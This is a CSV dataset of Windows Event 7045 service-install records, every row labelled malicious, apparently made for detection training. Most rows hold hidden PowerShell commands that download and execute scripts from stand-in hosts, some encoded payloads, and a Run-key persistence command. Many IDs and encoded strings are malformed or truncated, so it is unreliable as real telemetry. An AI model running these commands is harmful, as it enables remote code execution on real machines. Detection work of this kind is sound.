 Label,Event ID,Service Name,Service File Name,Service Type,Service Start Type,Service Account,Data Service Name,Timestamp,ID
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,a8D4g,2024-07-22T06:54:12.192Z,3f234cd1-9a32-4212-93f5rwe-46gt7h8j9kx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-07-22T08:41:10.219Z,4b5a2f6c-2e4a-4123-9a65-11223344x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Share Process,Demand Start,NT AUTHORITY\LocalService,a4K9,2024-08-22T10:14:20.192Z,4b27d423-85a9-4e34-b421-8f3a6a85bd4x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0A...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdRt,2024-03-22T08:41:19.219Z,685239c1-2b61-4972-b3asrty-46321f8gx
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -w hidden -enc aQBlAHgAIAAkAGQAeABwAHQAcgBpAG4AZwAgAC0AWwBpAG4AZgBvAHIAeQAuAGMAbwBtAC8AbQBpAGMAaQB0AHQAcgBlAHMAcwBpAG8AbgBzAGUAKAAiAGkAdABlAHMAIAB9ACIAYQBzAHUAdgBpAG4AaQBzAHQAcgBlAHMAcwBpAG8AbgBzAGUAKAAiAGkAdABlAHMAIAB9ACIAYQBzAHUAdgBpAG4AaQBzAHQAcgBlAHMAcwBpAG8AbgBzAGUAKAA=,Own Process,Auto Start,LocalService,,,
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT Authority\LocalService,xYz9a,2024-09-01T08:42:11.219Z,3b5a4d21-1a72-41c5-8e9b-g7h6j5kmlx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell.exe -WindowStyle Hidden -enc JABzAGUAbgBkAGUAcgBzAGUAbg...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SfL9a,2024-08-20T08:42:11.219Z,34a79f41-2b43-4f11-bc6a-93fasdf-xxxxx
malicious,7045,StealthyService,%windir%\system32\cmd.exe /c start /b /min powershell -w hidden -enc aQBlAHgAIAA9ACQ...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4kJV,2024-08-22T08:41:19.219Z,3b8ed6a2-567a-4fac-bc21-95c3a2f5a59fx
malicious,7045,MaliciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAcgB2AGUAcgB0AGkAYwBvAG4AZAAiAGUAbgB2ADoAYQB0AGkAbwBuAC0AaQBjAHIAbwBzAG8AZgB0AC4AYwBvAG0ALwBjAG8AbQBlAHQAcgBvAGQAZQBsAGUAYQB0AHUAbQBhAGwAYQB0AGUAUwB0AHIAaQBuAGcAKAAiAGUAbgB2ADoAYQB0AGkAbwBuAC4AZABlAG4AdAAuAGMAbwBtAG0AZQBuAHQAcgBvAGQAZQBsAGUAYQB0AHUAbQBhAGwAYQB0AGUAcgB2AGUAcgB0AGkAYwB,,,,,,
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAcgB2AGUAcgB0AG8A...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4RdTg,2024-08-15T08:41:19.392Z,85f3a2c9-4121-49c5-a8f2-e3f6b43cxx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v Updater /t REG_SZ /d ""%windir%\system32\windowspowershell\v1.0\powershell.exe -WindowStyle Hidden -NoLogo -ExecutionPolicy Bypass""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4qJkLn,2024-08-19T07:42:11.219Z,23e45a6f-9d21-4d57-8e12-3f9a5b1ax
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -enc SQBmACgAWwB...,Own Process,Auto Start,LocalService,4SdG,2024-08-22T07:41:19.219Z,3f5a2b8d-1234-4e56-9c87-8a5b23c4d9ax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,LocalSystem,kP4L,2024-08-20T08:42:11.219Z,4f31a2bc-5819-49c3-8dfs2-32f9b1a12b7x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,a4Kq,2024-09-02T08:45:21.192Z,4c7f6a8f-25f9-4f6d-b2a9-8e6c5f71a2b8x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAK...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG9y,2024-08-20T08:41:21.192Z,7a43ec59-241a-4f86-b974-e2c38871ax
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgB0AGkAcwB0AHIAIAB2AGUAcgB0AGUAYwBhAHQAaQBvAG4AVABlAGMAdABpAG4AZQB0AGgA,Own Process,Auto Start,LocalService,a7KpR,2024-08-22T03:45:12.192Z,43f67c1d-5a43-42b9-b9a4-85c9f4b43f3cx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc $aGVsbG8gd29ybGQh,Own Process,Auto Start,LocalSystem,4kGpL,2024-08-22T10:14:20.219Z,4e9f0a1e-431f-4b4c-b1a9-8d7f3b6c9x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,KJ4gR,2024-08-22T08:41:19.421Z,4e7a2b9d-f4c8-4b3e-95f1-12d8e5e1xxxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0A...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdJ7,2024-07-22T03:41:19.982Z,3f2a14e5-95d2-4121-83a4-5g9k8nlm1x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -executionpolicy bypass -file C:\Users\Public\Documents\script.ps1,Own Process,Auto Start,LocalSystem,a8KpR,2024-07-22T08:41:19.219Z,2a54f9e3-14bc-497a-9f6c-41d7b6c9x
malicious,7045,StealthyService,"%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,kJ9x,2024-07-22T03:45:12.192Z,4c2a8513-9b4f-43f2-b1a6-8e2f4f5gx
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c powershell.exe -w hidden -enc JABzAGUAbgBTAHQAYQBpAGwAYQBuAGcA...,Own Process,Auto Start,LocalService,4SdRtG,2024-03-22T08:41:19.219Z,43f7eda4-2198-405d-8aaf-56hjklmnx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,xkGpL4,2024-03-22T10:15:02.219Z,4c2a1f6d-5e2a-4b7d-8e8a-2f1c6b59a2bx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGkAbgBkAG8AdwBzAHQAaQBwAGEAcwBzAHcA,Own Process,Auto Start,LocalSystem,Gx4KoL,2024-09-02T07:45:21.192Z,3f987b42-14a5-49c6-8234-a92b1d9363x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX...",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-08-20T08:41:19.421Z,3b6a5921-1a9d-4f3c-ba67-81ac9f4cxx
malicious,7045,SuspiciousUpdater,"C:\Windows\System32\cmd.exe /c ""powershell -w hidden -enc JABzAGUAYwB1AG0AZQBuAHQ...""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4K,2024-07-22T03:14:10.219Z,3b7e54d1-9b41-4f92-85asdw-12hgfr456x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -File ""C:\Users\Public\Malicious.ps1""",Own Process,Auto Start,LocalSystem,a8dG5n,2024-03-20T08:45:12.109Z,4f52c87d-3214-42e8-8a5f-345dsfhnfx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAG4AdgBpAHMI...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,GxLp,2024-09-01T08:45:12.219Z,4f916f4a-2a5d-4b3b-bd46-9a3a23a8e4x
malicious,7045,UpdateAgent,%windir%\system32\cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1,Own Process,Auto Start,NT AUTHORITY\SYSTEM,a8D4g,2024-09-01T08:45:12.219Z,4c6b4d15-22c4-42a5-af32-9e85b123456x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c start /b /min powershell -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4sGpL,2024-08-20T08:45:12.219Z,2a47fda8-4a64-4123-b5a6-15asrwe-8bx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAbgBkAHkAIAB7AGUAbABsACAAZQB0ACAAdABoAGUAcgBwAHUAYgBsAGkAYwBvAGQAZQAgAHQAbwB3AG4AbABvAGEAZABlAGYAZQBuAHQAcwB3AG4AbABvAGMAYQBsAGwAIABiAGUAbABsACAAZQB0ACAAdABoAGUAcgBwAHUAYgBsAGkAYwBvAGQAZQAgAHQAbwB3AG4AbABvAGEAZABlAGYAZQBuAHQAcwB3AG4AbABvAGMAYQBsAGwA,Own Process,Auto Start,LocalSystem,GpZ,,
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -enc JABzAG0AcgBlAGEAZAAgAHMAZQBuAGQAbQBpAG4AZQByAGUAcgAgAHsACgAJABzAG0AcgBlAGEAZAAgAHMAZQBuAGQAbQBpAG4AZQByAGUAcgAgAHsACgAKACQAcgBlAGEAZAAgAHMAZQBuAGQAbQBpAG4AZQByAGUAcgAgAHsACgAJABzAG0AcgBlAGEAZAAgAHMAZQBuAGQAbQBpAG4AZQByAGUAcgAgAHsACgAJABzAG0AcgBlAGEAZAAgAHMAZQBuAGQAbQBpAG4AZQByAGUAcgAgAHsACgAKACQAcgBlAGEAZAAgAHMAZQBuAGQAbQBpAG4,,,,,,
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAbgBkAGUAcgB0AGkAYwBvAG4AcAByAG8AaQBuAHMALgBoAHQAdABwAHIAZQBcAGUAcwB0AG8AcwB0AC4AYwBvAG0ALwArAD0A,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SgV,2024-03-14T08:43:21.467Z,39f51d4b-49f8-4e2f-92e4-5b3391fc7ax
malicious,7045,SuspectService,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/script.ps1'))""",Own Process,Auto Start,LocalSystem,aG4kLp,2024-09-22T08:45:12.219Z,3b6f4521-1a85-49e2-82d5-4f6g7h8ix
malicious,7045,MsrSvc32,"%windir%\system32\cmd.exe /c start /min powershell.exe -windowstyle hidden -exec bypass -command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalService,xYz9,2024-08-25T08:49:21.219Z,6a51f43c-11d2-43a3-9c4a-25d37f0c01x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAYwBjAGUAbgBkAGIAYQBnAGUAdgBlAHIA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,Gx4Ea,2024-08-22T03:45:12.219Z,4f082b41-571d-49a8-b35e-7d8a4f1ax
malicious,7045,UpdateSvc32,"%windir%\system32\cmd.exe /c powershell.exe -exec bypass -Command ""& {Import-Module -Name (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')}""",Own Process,Auto Start,LocalSystem,4SdJ8,2024-08-20T09:45:12.219Z,43a21f7e-2c3b-49d2-a8df-1234567890x
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -Command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\System,Gx4k8,2024-03-22T08:45:12.192Z,3f3a12d7-49a5-4d2a-b8f1-95c23652374x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAdAAnAGEAYwB1AHIAZAA9ACQAYgA1ACIA,Own Process,Demand Start,NT AUTHORITY\LocalService,4SdF1,2024-08-20T08:45:12.219Z,3b4f59e2-121d-4e34-8a9b-1c2d3e4f5x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAA...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4Kq8a,2024-03-22T08:41:19.123Z,41a8f52d-2e95-4b23-9baf-5c22147cxx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc SqBFA... (truncated for brevity),Own Process,Auto Start,LocalService,aGpL4,2024-07-22T03:45:12.421Z,43a21e1c-1d2b-4f1d-b6a4-8f3e4f1a2gx
malicious,7045,StealthSvc,"%windir%\system32\cmd.exe /c start /b /min powershell -ep bypass -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,LocalSystem,4tGpL,2024-08-22T06:14:01.219Z,2b741c45-11a3-4b91-8e3a-7c164b8b0234x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4HjRt,2024-09-02T08:42:19.219Z,3b3f5a6d-142c-4f84-9a2d-1f4a3b2c9x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAYwB...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4Sec,2024-03-22T08:41:19.421Z,43a21f4d-9c81-4e3a-8e5b-123a5a9aax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4pL9k,2024-08-20T08:45:12.219Z,3b589241-9eca-46ac-ba1e-5c5317ax
malicious,7045,UpdateHelper,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAD0AIgB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,xYz4bG,2024-09-02T08:41:21.191Z,4a9e8f2b-219c-4f6b-8f5a-1aebf8c9x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAD0AXwB...,Own Process,Auto Start,LocalSystem,Gk8Lp,2024-03-20T08:45:12.192Z,6a7f4f22-45a8-4931-bf23-812ea5f4c4dx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -exec bypass -windowstyle hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4KpL,2024-07-22T03:45:12.192Z,3f2a1c4d-9b42-4211-b9aa-2e4856f1e6ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAHQAYQBuAGQ...,Own Process,Demand Start,LocalService,GpN4D,2024-07-22T10:45:12.189Z,4f9a93e1-21a4-412b-8e7c-56f8c5d8d34fx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gp4Kq,2024-03-22T08:41:19.123Z,4f67bdc4-8e43-4134-ba9e-3c50a9af4a6x
malicious,7045,SuspiciousUpdater,"C:\Windows\System32\cmd.exe /c ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\update.ps1""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,tG9k,2024-08-20T08:45:12.219Z,43f73d2c-1a2b-4c5d-91ab-8d3f2g7hx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c ""powershell -w hidden -c (New-Object System.Net.WebClient).DownloadFile('http://example.com/malware.exe', 'C:\Users\Public\malware.exe')""",Own Process,Auto Start,LocalSystem,kJ4xT,2024-09-02T08:41:19.421Z,43f8e611-9c45-4f71-bf83-8127f3cd89ax
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgB0AG8A...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG1l,2024-03-21T08:42:19.123Z,43bdf619-9421-419a-8f3e-5a4f5e2ax
malicious,7045,StealthUpdate,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('https://pastebin.com/raw/malicious_script'))""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdLp,2024-08-20T08:45:21.192Z,3fda82e5-1a7b-4c91-9fba-43gtyuioxx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG9rM,2024-08-20T08:41:19.214Z,2c53fc45-4e21-4b9a-8e5f-1a0b5f4cxx
malicious,7045,UpdateAgent,"cmd.exe /c powershell -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,a4D7H,2024-08-22T08:14:32.191Z,6b8f2c52-2b4c-4d34-8f1d-2e95e5f0f6bx
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4Kl,2024-09-01T08:45:12.219Z,4a85f92c-2198-4123-bc9a-8f314d7ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AIgB...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,KpG4a,2024-03-22T08:41:19.421Z,4c9f1d8e-3b6a-49e2-9251-0a96d9f8c3ax
malicious,7045,StealthSvc,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -nop -c ""New-Service -Name StealthSvc -BinaryPathName C:\Windows\Temp\stealth.exe""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx4D,2024-08-20T08:45:12.192Z,43a9f7c2-11e9-4b71-bf42-8b5678b31234x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c ""powershell -w hidden -c (New-Object System.Net.WebClient).DownloadFile('http://example.com/malware.exe', 'C:\Windows\Temp\malware.exe')""",Own Process,Auto Start,LocalSystem,KpQeR,2024-08-20T08:41:12.192Z,4a6f2c1d-8a14-4211-9f8gfd-87654321x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -f ""IEX ((New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'))""",Own Process,Auto Start,LocalSystem,4kGpL,2024-08-20T08:45:12.219Z,3b5a621c-9c41-4a92-b12c-6368d762a93fx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABlAG4AdgBpAGMAYQB0AGUAcgBvAHQAZQBsAHQALgBhAGwAYwBpAG4AVABvAHUAcgBvAHQAZQBsAHQALgBlAG4AYwBvAHUAbgBjAHQAaQBvAG4AVABlAGMAdABpAG4AZQB0AGgBbABsACAA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4pN5k,2024-05-22T03:41:19.421Z,23b96a43-71d5-42c2-92a1-85f4c6ax
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAG0AYQB...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4JsL8p,2024-09-01T10:45:20.129Z,4c87b5a2-15d4-4b5a-9a85-8b12c5d4e3fcx
malicious,7045,SuspiciousUpdate,%windir%\system32\cmd.exe /c powershell -w hidden -e JAAoACgAagBcAHQAZQ...,Own Process,Demand Start,LocalService,x67B,2024-08-20T10:45:21.192Z,45f89a23-42d3-4911-8a5f-85f3a19f34x
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGU...,Own Process,Demand Start,LocalService,4SdJ8,2024-03-21T08:45:12.192Z,43a2f7d1-9e2c-4d8a-85f3-5g67t1r4ex
malicious,7045,UpdateAgent,"%windir%\system32\cmd.exe /c powershell -nop -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gx4Ko,2024-08-22T08:45:12.219Z,4d2a1f6e-2e4f-4123-bc9a-8a5a41c9cxx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAHMAdwBvAHIAZQBuAGUAdwBvAHMAZQB0AHQAaQBjAGUAcgBdADoAOgBTAGkAZQBQAGwAYQB0AGUAIAB7ACAA,Own Process,Auto Start,LocalSystem,t9KpG,2024-08-20T10:45:23.421Z,487382f1-2f9e-4b22-8f3d-62ed8546a7x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c ""powershell -w hidden -nop -c (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1') | IEX""",Own Process,Auto Start,LocalSystem,4SdLk,2024-09-01T08:45:12.219Z,3f58af61-4e21-49f8-bc3a-2e6d5defgx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG0APQ..,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4S6Kp,2024-09-20T10:15:32.192Z,3fbaebae-45a2-4c62-8e1c-5b8d1f4ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -exec bypass -windowstyle hidden,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4xKJ8a,2024-08-20T08:41:22.192Z,46a21aa3-81e4-4127-bd35-4768a7c4f7c9x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGMAcABpAG4AZQ...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4G7a,2024-09-01T07:42:13.191Z,4e6f2b1c-fb3e-4e9d-b2a1-e43d3e4c3f1x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc aQBlAHgAIA...,Share Process,Demand Start,NT AUTHORITY\SYSTEM,GxwR4,2024-09-02T08:45:12.189Z,43b5ca31-d9b2-4c11-bc1f-9ad4e8a3a2cfx
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -enc JABzAGUAYwB...,Own Process,Demand Start,NT Authority\SYSTEM,x4KpR,2024-07-22T08:45:12.219Z,3fda4551-942c-4a23-8d45-1b8f3e4a26ax
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAHgA,Own Process,Demand Start,LocalService,aG9p,2024-09-01T08:42:19.212Z,4f43egf8-219e-4d45-8e1a-fasrjx
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://example.com/malware.ps1');""",Own Process,Auto Start,LocalService,aG4Kp,2024-08-20T10:14:21.219Z,42a7c31d-95f6-4c9e-8b23-21456ef7g8hx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalService,aG4K,2024-02-27T08:45:12.219Z,43a21f4d-1c11-4e3f-8g6t-7hj2k1l6mn8x
malicious,7045,UpdateSvc,cmd.exe /c start /b /min powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\update.ps1,Own Process,Auto Start,LocalSystem,4HG9a,2024-08-19T08:45:12.219Z,3f4c51a4-239e-4d12-8155-32b61cd4x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQ...,Own Process,Auto Start,LocalService,Gx42Lp,2024-07-22T03:15:22.189Z,4a2b1d5e-8c48-4f11-8f5b-1234567890x
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c start /b /min powershell -w hidden -enc JABzAGUAYwB...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-09-01T10:47:22.118Z,4f98a3d5-21cb-4124-9c43-871sdfgrebx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1'),Own Process,Auto Start,LocalService,Gx4K,2024-08-20T03:45:12.192Z,4a211f43-8b37-49f5-ba12-e5a6b2e5x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -ep bypass -w hidden -enc JABzAD0AJwBpAGIAaQB2AGUAYgBhAGwAYQBkAGUAbABsACAAfQA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,Gx4Kp,2024-03-22T07:51:14.219Z,4f38a593-95f3-4ee3-9c9b-8a6xxxxxxx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAcgBlAHcA...,Own Process,Auto Start,LocalSystem,4SdL9a,2024-09-01T10:45:23.192Z,6a7c5b32-11e7-4c85-8231-931a6b41c9x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAaQBlAHMAZQ...,Own Process,Auto Start,LocalSystem,aH4k,2024-07-22T10:45:12.219Z,4a3f2519-8e43-4c9f-bf62-95gftd3cxx
malicious,7045,UpdateSvc32,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAHgAIAAkAGEAbgBkAGUAcgBzAGUAbgB0AC4AcABzAD0AWwBoAGUAYwBvAHQAZQBuAHQAaQBvAG4AcwAuAGUAeABpAHQAcgBdADoAOgBBAFMAQwBMAEUAQwBUAFYAaQBzAGUAIABiAHUAZQB4AHUAYQBzAHMAaQBvAHQAYQB0AGkAbwBuAC4AYwBvAG0AcABlAG4AYQB0AGkAbwBuAC4AYwBvAG0AbwB1AHIAcwBlAHIAYQB0AGUAZAA=,Own Process,Auto Start,LocalSystem,a8K2n,,
